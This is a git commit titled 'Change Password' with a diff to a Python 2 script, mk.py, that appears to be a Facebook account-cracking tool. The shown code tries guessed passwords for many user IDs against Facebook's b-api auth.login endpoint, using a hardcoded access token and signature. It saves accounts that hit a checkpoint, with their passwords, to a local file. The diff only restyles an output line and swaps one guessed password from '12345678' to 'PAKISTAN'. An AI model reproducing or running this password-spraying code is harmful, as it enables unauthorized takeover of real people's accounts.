660a452b35a751d36ca77c4d5aa67fd1fffa7875
Mansoor Khan <53708636+Man50or@users.noreply.github.com>
2020-05-13 05:41:13 +0500

    Change Password

--- mk.py
+++ mk.py
@@ -329,7 +329,7 @@ def pilih_super():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m- ' + user + ' -\x1b[1;91m✧\x1b[1;97m-' + pass1
+					print '\x1b[1;91m[Checkpoint] ' + user + ' \x1b[1;91m| ' + pass1
 					cek = open("out/checkpoint.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
@@ -391,7 +391,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = '12345678'
+													pass6 = 'PAKISTAN'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
